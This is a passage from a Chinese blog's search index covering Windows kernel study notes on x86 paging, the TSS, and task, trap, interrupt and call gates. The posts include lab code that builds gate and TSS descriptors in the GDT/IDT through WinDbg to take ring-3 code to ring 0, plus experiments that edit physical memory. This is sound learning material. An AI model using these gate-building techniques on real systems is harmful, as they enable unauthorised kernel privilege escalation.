总结以上是关于PDE/PTE部分属性的含义，还有一部分位没有涉及到，例如G位，PWT位，PCD位，这些需要讲到控制寄存器和TLB相关概念时再细讲。","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"10-10-12分页","slug":"10-10-12分页","date":"2020-03-18T12:55:20.000Z","updated":"2020-03-19T13:43:58.205Z","comments":true,"path":"2020/03/18/10-10-12分页/","link":"","permalink":"http://cata1oc.github.io/2020/03/18/10-10-12%E5%88%86%E9%A1%B5/","excerpt":"","text":"保护模式下内存管理方式分为两种，段与页。前面的篇章中，简要介绍了段的知识，今天就来和大家聊聊页的知识，页是保护模式中更为重要的一环，随着系统进入32-Bit，段的作用明显降低了，取而代之的则是在段的基础上，更为细分的页。 段与页 这是Intel白皮书中介绍关于段与页的概要图，经过段的学习，可以很容易的理解左半部分，这是一个根据所提供的有效地址（图中Offset）以及段寄存器中确定的基址，锁定线性地址空间中的某个线性地址（图中Lin.Addr.）的过程。而右半部分，则是利用了页的功能，通过拆分线性地址，一步步转化成了物理地址。 上述提到了3个概念，有效地址，线性地址以及物理地址，文字叙述会让人混淆，我们来看一条语句： Code1mov dword ptr ds:[0x12345678], 0x123 其中，0x12345678是有效地址 ds.Base + 0x12345678是线性地址 这都非常好理解，那什么是物理地址呢？考虑这样一个问题，掌握3环知识的小伙伴们知道每个进程都有4GB的内存空间，这时如果有一个进程A，给会进行一个操作，给ds.Base + 0x12345678赋值0x123，还有一个进程B，同样会给ds.Base + 0x12345678赋值0x123，那么ds.Base + 0x12345678处的位置到底是哪个值呢？还是两者都不是呢？这就涉及到了物理地址的概念。 PDT与PTT每个进程都有一个CR3的值，这很突兀，CR3是什么？实际之前在TSS切换时也用到了，具体等到了控制寄存器那会详细分析。简单来说，CR3被用来切换和定位当前正在使用的页表，它是一个32位的寄存器，其中高20位指向一个物理页（Windows系统上，一个页的大小是4KB，也就是4096个字节），如下图所示： 这图该怎么看呢？首先CR3会指向一个物理页，这个物理页又叫做页目录表（PDT），页目录表每个元素叫做页目录表项（PDE），页目录表项，每个4字节，所以一共有1024个页目录表项，CR3就好比一本书，PDT就是这本书的目录，PDE就是章节，这是一本有1024个章节的书（哇塞，真厚啊U•ェ•*U），这样就好理解多了。这是第一级。 页目录表项又指向一个第二级的表，叫做页表（PTT），页表的大小也是4KB，页表中的每个元素叫做页表项（PTE）。页表项可以理解为书中章节的每个小节，就好比第一章里面有1024个小节，这个小节就是PTE，这1024个小节加起来，构成一个小节表，就是PTT。 第二级介绍完了，第三级也就好理解了，既然书中每个章节的每个小节理解了，接下来就是页码了，每个小节都会对应书中的某个页码。而这个页码，就是相当于的物理页了。这样就可以理解这张图了，就是一部部找到物理页。 10-10-12分页Windows采用三种分页方式，在32位系统上主要有10-10-12分页和2-9-9-12分页这两种方式，在64位系统上增加了9-9-9-9-12这种分页方式，后面的文章会依次介绍32位下的两种分页方式。首先从10-10-12开始。 首先修改C盘的boot.ini文件，将noexecute改成execute，重启虚拟机，即可使用10-10-12分页方式 10-10-12分页是如何工作的呢？来看一个简单的程序： c123456789#include \"stdafx.h\"int main(int argc, char* argv[]){ int a = 0x123; printf(\"%x\", &a); getchar(); return 0;} 这个程序很简单，给a赋值0x123，并查看a的地址 而这个地址0x12ff7c，实际上就是前文提到的线性地址，接下来我们将这个32位的地址按照10-10-12的方式进行拆分： 1.将0x12ff7c拆分成二进制：0000 0000 0001 0010 1111 1111 0111 1100 2.将这32位二进制数，按照10-10-12的方式组合： 每部分位数 二进制 十六进制 10 0000 0000 00 0 10 01 0010 1111 12f 12 1111 0111 1100 f7c 3.根据Cr3找到页目录表（PDT）中的页目录表项（PDE）： 首先在Windbg中执行!process 0 0指令，找到当前程序的Cr3，Cr3的值指向的就是页目录表的首地址。由于第一部分值为0，所以要查找的PDE，需要用Cr3+0*4(乘4是因为每个PDE大小是4字节)，这里注意一下，由于查找的是物理地址，所以使用的是!dd指令。 4.根据PDE找到页表（PTT）中的页表项（PTE）： 上一步已经找到了PDE，PDE的值指向的是某个PTT的首地址，方法和上一步一样，用PDE中的值+12f(拆分完的第二部分)x4，就可以得到PTE，这里要注意一点，将PDE中的值代入时，后12位置0，由于后12位为属性位，在查找的过程中不起作用 5.根据PTE确定物理地址： 确定PTE后，就剩最后一步了。由于一个物理页的大小本身就是4KB，也就是2的12次方，所以当确定了前20位后也就确定了物理页，因此我们要找的内容就在219da000这个物理页上的某个物理地址。这个物理页的范围是219da000~219dafff。现在可以理解，PTE指向的是一个物理页的首地址，根据最后12位的来确定，我们要寻找的值在物理页上的偏移，也就真正的找到了这个物理地址。 根据实验截图，发现我们一开始存在变量a里面的0x123，真正存的地方在0x219daf7c这个物理地址的位置，这就是通过线性地址一步步的找过来的，这些工作都是CPU做的，比如当我们读取a这个地址上的值是，CPU会通过分页机制读取该物理地址的值，然后再显示出来。 有趣的实验读错值了？有了10-10-12分页的知识，来做一个有趣的小实验 c1234567891011#include \"stdafx.h\"int main(int argc, char* argv[]){ int a = 0x123; printf(\"%x\", &a); getchar(); printf(\"%x\", *(&a)); getchar(); return 0;} 这个代码非常简单，一般人认为，会先输出a的地址，然后再输出0x123。但有了物理页的知识，我们就可以做一些手脚了。 很奇怪吧？为什么输出不是0x123，而却输出0x456呢？原因就在于，我们偷偷修改了变量的物理地址上的值，将原本的0x123改成了0x456，因此，CPU再次去物理页读取时，值已经发生了变化，读到了修改后的值。 0地址也能存值？c1234567891011121314#include \"stdafx.h\"int main(int argc, char* argv[]){ int a = 1; printf(\"%x\", &a); getchar(); *(int*)0 = 0x123; printf(\"address0: %x\", *(int*)0); getchar(); return 0;} 这是个显而易见运行会失败的程序，为什么？因为你给0地址赋值了，有点C/C++开发经验的人都知道，0地址是不能存值的，为什么？因为运行不过去啊！这不扯淡嘛！你看我就运行过去了！ 这又是为什么呢？其实0地址不能存值的原因是，没有给它挂物理页，既然没有物理页，那CPU按照分页去查的时候，就查不到了；那么只要给他挂个物理页，就可以给这个线性地址存值了，具体操作如下。 总结 一张页表能包含的物理页：1024*KB = 4MB 10-10-12分页共有1024张页表：1024*4MB = 4GB 前20位的值如果相同，那么一定在同一个物理页 一个PTE最多可以指向一个物理页；PTE可以没有物理页；多个PTE可以指向同一个物理页 参考资料：《Intel白皮书第三卷第四章》 参考教程：https://www.bilibili.com/video/av68700135?p=24","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"任务门","slug":"任务门","date":"2020-03-17T01:10:51.000Z","updated":"2020-03-17T03:46:00.956Z","comments":true,"path":"2020/03/17/任务门/","link":"","permalink":"http://cata1oc.github.io/2020/03/17/%E4%BB%BB%E5%8A%A1%E9%97%A8/","excerpt":"","text":"为何使用任务门之前任务段中提到，进行任何切换时可以还可以使用任务门。那么既然存在TSS段描述符了，为何还需要任务门呢？ 简要概括，任务门有如下优势： 任务门可以放在GDT表中，也可以放在IDT表中，还能放在当前线程的LDT表中，而TSS段描述符只能在GDT表中 任务门可以让低权限的线程进行任何切换，任务门的结构中也有DPL属性，当通过任务门去访问TSS描述符时，一旦通过任务门，TSS段描述符就不再进行检查了，即使你是个CPL=3的程序，而TSS段描述符的DPL=0，只要任务门DPL=3，就可以通过任务门完成任务切换，稍后会做这个实验。 由于任务门可以位于IDT表中，所以当遇到中断或者异常时，可以切换到独立的任务去处理异常 下面为不同表中，任务门进行任务切换的过程： 任务门描述符 任务门描述符的结构非常简单，真正用到的只有24位，属性位里：DPL一般设置为3，方便应用程序访问，Type则是固定的0101，TSS段选择子，顾名思义，就是一个段选择子，指向位于GDT表中TSS段描述符的位置。其余位均为保留位，置0即可。 任务门实现任务切换这一步十分简单，仅仅比使用TSS多了一个步骤而已，这里也不细讲了，直接上步骤。 首先，编译源文件，下断点，确定TSS的地址，根据地址构造TSS段描述符： 第二步，根据GDT表中构造好的TSS段描述符位置，在IDT表中构造任务门： 第三步，在Windbg中使用!process 0 0指令确定CR3的值，并填入自己的TSS中： 执行程序，获取到自己构造的TSS表数据，任务切换成功： 总结任务门总体还是比较简单，由于是通过int 0x20中断进入，因此iretd作为中断返回出来，比起JMP FAR还需要手动修改EFLAGS的NT位和previous task link容易的多。比较遗憾的是，这一部分的小作业，通过任务门进1环，还是失败了。这里稍微说一下我的思路，由于是进入1环（虽然windows没用1环），但我们让他进入1环，就替换1环的寄存器，ESP1和SS1，当然SS1和CS都需要设置CPL值为1，但是原本0环这两个段寄存器控制的都是DPL=0的段，因此我们需要构造一个1环的段描述符，我实验的时候构造了一个1环的非一致代码段描述符和一个1环的数据段描述符，让任务切换后的CS，SS载入段描述符信息用。同时还需要把TSS段描述符的DPL设置为1，其余值保持不变。可惜，几次都死掉了，实验没能成功，群内也没人这个进入1环的实验，以后有人讨论的话会考虑再试试。 任务段任务门这里有些遗憾吧，的确有点复杂，没理解透彻，感觉任务段那讲的也不是很清晰，希望以后我还能看得懂吧，接下来进入页的内容了，保护模式的关键来了，得掌握好。","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"任务段","slug":"任务段","date":"2020-03-16T12:41:30.000Z","updated":"2022-07-16T06:48:53.966Z","comments":true,"path":"2020/03/16/任务段/","link":"","permalink":"http://cata1oc.github.io/2020/03/16/%E4%BB%BB%E5%8A%A1%E6%AE%B5/","excerpt":"","text":"要点回顾在调用门、中断门与陷阱门中，一旦发生权限切换，那么就必有堆栈的切换。而且，由于CS的CPL发生改变，也导致了SS也必须要切换。这时问题来了，我们知道EIP和CS的值都可以通过门描述符获得，那么ESP和SS是哪来的？这就是引出了今天的内容：TSS（Task-state segment），任务状态段。 TSS设计初衷想要学习一类知识，首先要了解它被设计出来的目的，这样就能找到方向，更好的了解它。CPU在运行时会频繁的切换任务，每次切换任务时，还没执行完的任务怎么办？总不能下次重新执行吧，于是需要保存上一个任务的上下文环境，于是，TSS诞生了，TSS是一块大小为104(0x68)个字节的内存，没错，TSS不是什么寄存器，就是一段内存，或者说是一个段，这段内存可以保存32-Bit下所有通用寄存器以及段寄存器的值，这样CPU就可以切换到新任务时，仍然保留上一个任务的环境，方便新任务执行完后，能够完好的回到先前的任务继续执行。 注意，TSS是一个段，有段就有段寄存器和段描述符哟！比如我们熟悉的CS，CS就是段寄存器，它描述的是代码段，同时，它会通过段选择子从GDT表的代码段描述符中载入段的相关信息，通常情况下，代码段的范围是0~FFFFFFFF（大小是4GB）；这样一对比，就可以理解了，TSS也是如此，因为TSS也是一个段（大小是104字节），所以应该存在一个描述TSS的段寄存器从一个段描述符里加载TSS相关信息。这就是今天会依次介绍的TR寄存器和TSS段描述符。 这里补充一点知识，尽管Intel设计TSS的初衷的为了方便任务切换（CPU层面叫做任务切换，操作系统层面叫做线程切换），但是Windows认为这个TSS设计的不好，因此并没有采用这个结构进行线程切换，并且Linux也没有采用TSS进行线程切换，这俩操作系统用的都是堆栈进行线程切换的。那么Windows用到了这个结构没有，当然是用到了，但仅仅用到了ESP0和SS0这两个值。 TSS结构先来看看TSS的结构 大部分都应该比较熟悉，这里介绍几个较为陌生的字段： Previous Task Link：这里保存的是上一个TSS的段选择子，比如任务发生了切换，新任务执行完后，如何才能找到先前未能执行完的任务呢？就得依靠这个值了（前面不是说了Windows不用TSS进行线程切换嘛，是呀，但是这里讲解的这个字段的作用，设计初衷就是为了任务切换） ESP0/SS0：当发生提权时，0环的ESP和SS的值就是从这里取的 CR3：有人会问，我哪知道取哪个TSS的ESP0和SS0呢？就是这个值的作用了，这个值帮我们确定当前位于哪个线程，之后在页的篇章中会学到CR3的相关内容。 LDT：这个值通常都是0，Windows没有用到LDT表，因为LDT表只对当前的线程有用 I/O Map：这个位置涉及到硬件IO了，值一般是固定的 TSS段描述符 TSS段描述符只能存在GDT表中，不能存到LDT或者IDT中，所以它的结构和之前介绍的段描述符是类似的，区别在于个别位的不同 G位：在代码段/数据段描述符中，这个位置通常位1，因为这两个段的范围通常是4GB，而TSS的大小是104字节，单位是字节，因此这个值为0 Type域：这个值为1011或1001，其中B位是Busy位，置1时说明该TSS是否被载入或者嵌套，载入说明CPU正在执行该任务；嵌套则表明该任务处理了一半，切换到了另一个任务中去，但该任务并未执行完。 Base/Limit：Base确定TSS段的起始位置，Limit确定TSS段的大小，Base~Base+Limit就是TSS段的范围。 TR寄存器在一开始的探究段寄存器的文章中提过，CPU共有8个段寄存器，TR就是其中之一。先前提到过，TR寄存器的工作原理和其它段寄存器一样，通过段选择子加载GDT表的TSS段描述符中的信息，方便CPU找到TSS的位置，具体工作原理如下： 这里介绍两个操作TR段寄存器的指令LTR和STR： LTR：这是一个特权指令，只有0环的程序才能调用；作用是将段选择子写入TR寄存器 STR：STR不是特权指令，这个指令3环程序也可以调用，所用是读取TR寄存器的值 需要注意的一点，修改TR寄存器的值，只是会载入新的TSS段描述符信息，并不会对修改前的TSS段造成影响。 实现任务切换虽然说了Windows并没有将TSS用来进行线程切换，但是我们仍然可以手动实现任务的切换。 直接修改TR寄存器是不能做到任务切换的，但是可以通过JMP FAR或者CALL FAR来加载TSS段描述符来实现。下面分别使用两种方法来实现（两种实现方法细节有很多差别） 一般情况下，任务切换发生在下列四种情况之一： 当前程序，任务或者进程执行JMP/CALL语句，且参数是位于GDT表中的TSS段描述符 当前程序，任务或者进程执行JMP/CALL语句，且参数是位于GDT表或者当前LDT表中的任务门描述符 一个中断或者异常触发了在IDT表中的任务门描述符 当前任务执行IRET指令，且EFLAGS寄存器的NT位为1时 CALL FAR实现本次CALL FAR实现采用第一种任务切换的情况。 设计一个TSS，存储任务切换时必要的信息，其中包括ESP0，SS0，CR3，EIP，ESP，段寄存器，位图控制。 ESP0：也就是任务切换后的堆栈，可以自己创一个空数组，然后写入数组的首地址，就可以作为堆栈使用。 段寄存器及SS0：这些值，在0环通常都一样，可以进入Windbg参考其它TSS的值，这里使用的是SS/SS0 = 0x10，ES/DS = 0x23，CS = 0x8，FS = 0x30，GS = 0x0 EIP：这就是要跳转后执行的地方，可以写一个裸函数来验证是否切换成功，直接取裸函数地址即可，我这里的值为0x401020（每个人机器可能不一样） CR3：这个值，需要在执行前，中断到Windbg寄存器中，通过!process 0 0指令获取。 位图控制：这是一个默认值为0x20AC0000 构造完的TSS如下： c12345678910111213141516171819202122232425262728DWORD tss[0x68] = { 0x00000000, //Previous Task Link (DWORD)stack, //ESP0 0x00000010, //SS0 0x00000000, //ESP1 0x00000000, //SS1 0x00000000, //ESP2 0x00000000, //SS2 (DWORD)Cr3, //Cr3 0x00401020, //EIP 0x00000000, //EFLAGS 0x00000000, //EAX 0x00000000, //ECX 0x00000000, //EDX 0x00000000, //EBX (DWORD)stack, //ESP 0x00000000, //EBP 0x00000000, //ESI 0x00000000, //EDI 0x00000023, //ES 0x00000008, //CS 0x00000010, //SS 0x00000023, //DS 0x00000030, //FS 0x00000000, //GS 0x00000000, //LDT 0x20ac0000 //IO_MAP }; 然后我们需要根据这个TSS的地址，来构造我们的TSS段描述符 地址为0x12fd70 因此TSS段描述符为：0000e912`fd700068，e->DPL=3：是为了3环的程序可以访问这个段描述符，0x68就是104字节，9说明未被载入。然后让我们填入段描述符 接着运行程序，需要采集Cr3的值，先中断到Windbg，再通过!process 0 0指令获取，取最后的一个值 在程序中填入cr3的值后回车，发现可以成功取到任务切换后ESP，CS，SS，并且均为我们设定的值，实验成功。 完整代码如下： c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include \"stdafx.h\"#include int saveEax, newESP;short newCS, newSS;__declspec(naked) void Get_Value() { __asm { mov saveEax, eax mov newESP, esp mov ax, cs mov newCS, ax mov ax, ss mov newSS, ax mov eax, saveEax iret }}int main(int argc, char* argv[]){ char stack[100] = {0}; char buffer[6] = {0x0, 0x0, 0x0, 0x0, 0x4B, 0x0}; int Cr3 = 0; printf(\"Input: \"); scanf(\"%x\", &Cr3); getchar(); DWORD tss[0x68] = { 0x00000000, //Previous Task Link (DWORD)stack, //ESP0 0x00000010, //SS0 0x00000000, //ESP1 0x00000000, //SS1 0x00000000, //ESP2 0x00000000, //SS2 (DWORD)Cr3, //Cr3 0x00401020, //EIP 0x00000000, //EFLAGS 0x00000000, //EAX 0x00000000, //ECX 0x00000000, //EDX 0x00000000, //EBX (DWORD)stack, //ESP 0x00000000, //EBP 0x00000000, //ESI 0x00000000, //EDI 0x00000023, //ES 0x00000008, //CS 0x00000010, //SS 0x00000023, //DS 0x00000030, //FS 0x00000000, //GS 0x00000000, //LDT 0x20ac0000 //IO_MAP }; _asm { call fword ptr buffer } printf(\"ESP: %x, cs: %x, ss: %x\", newESP, newCS, newSS); getchar(); return 0;} 以上是通过Call Far实现的任务切换。还有另一种方法，是通过JMP FAR来实现，而且JMP FAR实现会更加困难一些。这里简要概括一下，当使用CALL FAR时，CPU会自动帮你用当前任务的段选择子填写你TSS的Previous Task Link字段，同时给你的Eflags的NT位置1，这个NT位有什么用呢，就是关系到iret这个指令的意义，当Elfags的NT为1时，iret表示根据Previous Task Link的值，从当前任务返回到前一个任务中去，当NT为0时，这是一个中断返回指令。而当你使用JMP FAR实现时，你需要手动给Pervious Task Link字段赋上前一个任务的段选择子，此外你需要手动给Eflags的NT位置1，当然这可以通过 Code12345pushfdmov eax, [esp]or eax, 0x4000mov [esp], eaxpopfd 来实现，此外，还需要确保前一个TSS段的段描述符Busy位的值为1，这样才能确保该任务处在嵌入的状态。 总结这是开博客以来，最艰难的一篇了，看视频楞是没看明白，然后又去翻Intel白皮书，看明白了然后开始代码实现，CALL FAR的任务切换实现的还算顺利，但是JMP FAR的问题就比较大了，一下午都没整出来，蛋疼啊~ 不想再弄了，看了群友的代码，感觉自己好像也没写错，就是一直死。明天打算整一整任务门吧，完了就到页的知识了，那边掌握的还算不错，可以轻松一阵子了，坚持呀！ 参考资料：《Intel白皮书卷3-第七章》","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"陷阱门","slug":"陷阱门","date":"2020-03-15T08:31:07.000Z","updated":"2020-03-15T10:56:29.726Z","comments":true,"path":"2020/03/15/陷阱门/","link":"","permalink":"http://cata1oc.github.io/2020/03/15/%E9%99%B7%E9%98%B1%E9%97%A8/","excerpt":"","text":"这一篇来说陷阱门，陷阱门这东西，就没什么好讲的，应该Windows几乎没怎么用，陷阱门也是位于IDT表里的，列出前48个描述符，就没有陷阱门。。。 陷阱门描述符 看图，陷阱门描述符，和中断门描述符，就1个位不一样，中断门的Type域是1110，陷阱门是1111 代码实现代码实现也和中断门的完全一样，搬过来就行了。 c123456789101112131415161718192021222324252627282930313233343536#include \"stdafx.h\"int saveEax = 0;short cs3, ss3;int eflags3, eflags0, esp3;__declspec(naked) void GetValue() { _asm { mov saveEax, eax pushfd mov eax, [esp] mov eflags0, eax popfd mov eax, [esp+4] mov cs3, ax mov eax, [esp+8] mov eflags3, eax mov eax, [esp+0xc] mov esp3, eax mov eax, [esp+0x10] mov ss3, ax mov eax, saveEax iretd }}int main(int argc, char* argv[]){ _asm { int 0x20 } printf(\"cs3: %x, eflags3: %x, esp3: %x, ss3: %x\\n \\teflags0: %x\", cs3, eflags3, esp3, ss3, eflags0); getchar(); return 0;} 与中断门的差别那可能有人要问了，既然陷阱门和中断门完全一样，有什么存在的意义。那还是有一点不同的，来看两次执行的结果： 同样的代码，执行结果不同，可以发现，陷阱门和中断门的区别在于，中断门执行后EFLAG寄存器的值发生了改变，而陷阱门不会改变EFLAG，这就是陷阱门和中断门的差别。 EFLAG寄存器结构 根据EFLAG寄存器的结构可以得知，中断门执行后，将IF位置0了，但陷阱门不会，这就是中断门和陷阱门的唯一区别。 那么这个IF位有什么用呢？为什么陷阱门要将IF位置0呢？ 稍查资料，可以了解到IF标志是用于控制处理器对可屏蔽中断请求的响应。置1以响应可屏蔽中断，反之则禁止可屏蔽中断。IF标志对不可屏蔽中断没有影响。 这里举个简单的例子说明下什么是可屏蔽中断，什么是不可屏蔽中断。打开任务管理器，可以看到有很多进程正在运行，这时候，你想把电脑锁屏，于是按下Win+L，这个时候键盘会向CPU发送一个可屏蔽中断，告诉CPU，用户按下了Win+L键，需要执行锁屏功能，如果此时EFLAG的IF位为1，这是CPU会短暂放下手上的任务，先去处理你的锁屏任务，处理完后，你的电脑锁屏了，CPU会继续运行刚刚处理的进程；如果此时ELFAG的IF位为0，那么CPU就和没听到一样，继续做它自己的事。如果遇到意外状况，电脑的电源线拔了下来，断电了，这时电源会向CPU发送一个不可屏蔽中断，这个中断不受IF位影响，CPU一定会去处理。这时有人会问了，断电后CPU还怎么工作？其实在主板上，是有电容的，可以在断电后让CPU再去做一些清理工作，这就是不可屏蔽中断。 总结中断门和陷阱门的唯一区别：中断门执行时，将IF位清零，但陷阱门不会。 参考教程：https://www.bilibili.com/video/av68700135?p=20","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"中断门","slug":"中断门","date":"2020-03-15T06:26:54.000Z","updated":"2020-03-15T08:13:54.134Z","comments":true,"path":"2020/03/15/中断门/","link":"","permalink":"http://cata1oc.github.io/2020/03/15/%E4%B8%AD%E6%96%AD%E9%97%A8/","excerpt":"","text":"上一篇提到过，Windows是不使用调用门的，所以在GDT表里没有找到调用门，那么Windows如何实现代码跨段，提权等行为呢？这里用的较多的是中断门，接下来就来介绍一下中断门。 IDT表与GDT的区别首先要提到IDT表（中断描述符表），在上一篇提到的调用门的门描述符，都在GDT表里，而中断门的门描述符在另一张叫做IDT的表里面。同GDT一样，IDT也是由一系列描述符组成的，每个描述符占８个字节。但需要注意的是，IDT表中的第一个元素不是NULL。 在Windbg中查看IDT表的基址和长度： IDT的构成IDT表可以包含3种门描述符： 任务门描述符 中断门描述符 陷阱门描述符 中断门执行流程有了IDT表的概念后，咱们就可以开始讲讲中断门的执行流程，实际上和调用门差别不是很大，可以类比的来看： 执行调用门的指令：CALL CS:EIP，其中CS是段选择子，包含了查找GDT表的是一个索引. 执行中断门的指令：INT N，其中N是IDT表的一个索引 执行流程就只有这个差别，当CPU通过N这个索引在IDT表中找到了中断门描述符后，执行的步骤就和调用门的步骤完全一样了，可以参考调用们的执行流程。这里要注意一点，当找到中断门描述符后，还是会通过描述符里的段选择子，去GDT表中找需要跳转的代码段。所以说中断门的执行会查找两张表，先查找IDT表，再查找GDT表。 中断门描述符简要说完了IDT表（实际上和GDT表没啥差别）来看看中断门描述符的结构： 粗略一看，和调用门描述符没差呀。这不就是无参调用门描述符换了个Type域嘛。没错，的确是这样（这里解释下D位，可以理解为段描述符的DB位，置0时为16位中断门，置1时为32位中断门）。当你发现这点时，说明调用门的结构你理解清楚了。因此结构不再赘述，可以参考调用门 中断返回与调用门使用长返回RETF不同，中断门使用中断返回指令：IRET/IRETD INT N指令： 在没有权限切换时，会向堆栈压入3个值，分别是CS，EFLAG，返回地址 在有权限切换时，会向堆栈压入5个值，分别是SS，ESP，EFLAG，CS，返回地址 这也是与调用门不同的地方，中断门会多压入一个值。于是有小盆友就要问啦，“死肥宅哥哥，为什么中断门会多压入一个参数呢？” 这还不明显吗，你想想人家调用门为什么要压入值进入堆栈啊？肯定是这些值会改变啊，所以要用堆栈保存一下，等长返回的时候，再还原状态；中断门多压入了一个EFLAG说明通过中断门跨段时，EFLAG的值会变啊！ 所以，在中断门中，不能通过RETF返回，而应通过IRET/IRETD返回，其实只要改改堆栈，就可以通过RETF返回中断门，IRETD返回调用门。 代码实现中断门比较简单，这里演示一个实现的范例 c123456789101112131415161718192021222324252627282930313233343536#include \"stdafx.h\"int saveEax = 0;short cs3, ss3;int eflags3, eflags0, esp3;__declspec(naked) void GetValue() { _asm { mov saveEax, eax pushfd mov eax, [esp] mov eflags0, eax popfd mov eax, [esp+4] mov cs3, ax mov eax, [esp+8] mov eflags3, eax mov eax, [esp+0xc] mov esp3, eax mov eax, [esp+0x10] mov ss3, ax mov eax, saveEax iretd }}int main(int argc, char* argv[]){ _asm { int 0x20 } printf(\"cs3: %x, eflags3: %x, esp3: %x, ss3: %x\\n \\teflags0: %x\", cs3, eflags3, esp3, ss3, eflags0); getchar(); return 0;} 根据GetValue函数的地址构造中断门描述符，然后填入中断门里即可 执行结果如下： 然后我们用int 3中断到Windbg里验证一下 验证成功。 总结通过调用门与中断门的对比，来总结一下中断门： 调用门通过CALL FAR指令执行，但中断门通过INT指令 调用门查询GDT表，中断门查询IDT表（后续也会再查询GDT表） CALL CS:EIP中的CS是段选择子，由3部分组成，而INT N指令中的N只是索引，中断门不检查RPL，只检查CPL 调用门可以有参数，但中断门没有参数 参考教程：https://www.bilibili.com/video/av68700135?p=19","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"调用门","slug":"调用门","date":"2020-03-14T06:34:21.000Z","updated":"2021-02-28T08:04:47.465Z","comments":true,"path":"2020/03/14/调用门/","link":"","permalink":"http://cata1oc.github.io/2020/03/14/%E8%B0%83%E7%94%A8%E9%97%A8/","excerpt":"","text":"前一篇中提到CALL FAR指令最终跳转的地址是调用门里，今天就要分析一下调用门。首先从调用门的执行流程开始 调用门执行流程指令格式：CALL CS:EIP(EIP是废弃的) 执行步骤： 根据CS的值查GDT表，找到对应的段描述符，这个描述符是一个调用门。 在调用门描述符中存储另一个代码段的选择子 选择子指向的段的Base+调用门里的Offset，就是真正要执行的地址 光看描述，的确很难懂，结合调用门描述符来分析，会好理解很多 调用门描述符 高4字节8~15位：这是和普通段描述符完全一样的8位，其中第12位是判断该描述符是系统段还是数据段或代码段的位置，调用门描述符是系统段，所以此处值一定是0。接下来的Type域，这个根据段描述符那章中也能找到，32位的调用门描述符，Type域为1100，这也是确定的。 高4字节的高16位+低4字节的低16位：这两块区域加起来刚好是32位，构成一个Offset，也就是调用门执行流程第三步里Base加上的Offset，那么Base哪里拿呢？ 低4字节的高16位：这16位是一个段选择子，有段选择子，就可以拆分，于是RPL，TI，Index都能解析出来，这时候就可以根据Index去GDT表里找到段描述符，而这个段，就是调用门跳转的段，因此要用这个段的Base+Offset便可获得真正要执行的地址。 高4字节的低5位(第5~7位均为0)：这5位的作用是描述调用门传进去的参数，调用门是可以传参的，而参数的个数，决定了这个位置的值 下面，通过代码来验证调用门的执行流程。 无参调用门调用门分为无参和有参（示例默认都提权）两种情况，这里先用无参调用门进行实验： 构造调用门因为Windows是不使用调用门的，所以需要自己构造一个调用门：0040EC00 00081010 为什么要这样构造呢？先看最熟悉的那8位，EC = 11101100，P=1，S=0，调用门=1100，DPL为啥选取3呢。首先，调用门的提权在于通过调用门后，新的段选择子会修改CS达到CPL的提权，但是访问调用门描述符还是需要保证CPL=DPL，因此，DPL需要设置为3。由于无参调用门，也就没参数，因此参数位为0，EC00也就解释清了。 接下来看0008，这个也很好理解，段选择子嘛，拆分一下，RPL=0，Index=1，我们去Windbg里看一下就好了 这下就清晰了，指向00cf9b00 0000ffff这个段描述符，拆分一下，Limit=FFFFFFFF，G=1，Base=00000000，是个非一致代码段。看来想要跳转成功，也得是0环的代码段才行。 由于Base为0，那么跳转到的地方就是0+401010，那这个401010是哪来的呢？这得看代码才能说清。 代码实现c12345678910111213141516171819202122232425262728293031323334353637383940#include \"stdafx.h\"int saveEax = 0;short oldCS = 0;short newCS = 0;short oldSS = 0;short newSS = 0;int oldESP = 0;int newESP = 0;__declspec(naked) void GetValue() { __asm { mov saveEax, eax lea eax, [esp] //new esp mov newESP, eax mov eax, [esp+8] //old esp mov oldESP, eax mov eax, [esp+4] //old cs mov oldCS, ax mov ax, cs mov newCS, ax mov eax, [esp+0xc] //old ss mov oldSS, ax mov ax, ss mov newSS, ax mov eax, saveEax retf }}int main(int argc, char* argv[]){ char buffer[6] = {0x0, 0x0, 0x0, 0x0, 0x4B, 0x0}; __asm { call fword ptr [buffer] } printf(\"%x, %x, %x, %x, %x, %x\", oldCS, newCS, oldSS, newSS, oldESP, newESP); getchar(); return 0;} 来看一下代码，从main函数开始看起，我们自己构造一个CS:EIP（EIP已废弃）的6字节char型数组，然后在汇编中执行CALL FAR调用我们构造的CS:EIP，接着打印部分内容。 可以看出执行调用门的语句嵌入了汇编里，根据上方在构造调用门时的分析可以得出，最终调用门跳转的地址会是401010，那么这个401010是怎么来的呢？其实就是GetValue函数的地址，我们知道通过调用门后会跳转到一个地址，但是如何才能检测成功跳转并提权呢？就得有一个函数来收集这些信息并将其打印出来，也就有了GetValue函数（GetValue地址通过VC下断点查看，然后写入构造的调用门描述符中）GetValue要声明成裸函数，这样堆栈只需自己平衡，可以避免元素访问的位置过远。 根据前一篇文章的内容，如果跨段并提权，堆栈内部大致情况如下 因此，这里采用通过全局变量，来依次读取堆栈不同位置的值，并打印查看结果。 由结果看，ESP，CS，SS均发生了切换，且CPL变为0，ESP的值也变为了一个高2G的数 为了验证结果的正确性，我们可以通过中断再看一下0环的堆栈结构，将裸函数中的汇编代码清除，只留下int 3和长返回语句如下： Code1234_asm { int 3 retf} 然后重新执行，会中断到Windbg（为什么会从虚拟机中断到Windbg，这个到后面中断部分会详细讲解）查看栈顶部分内存 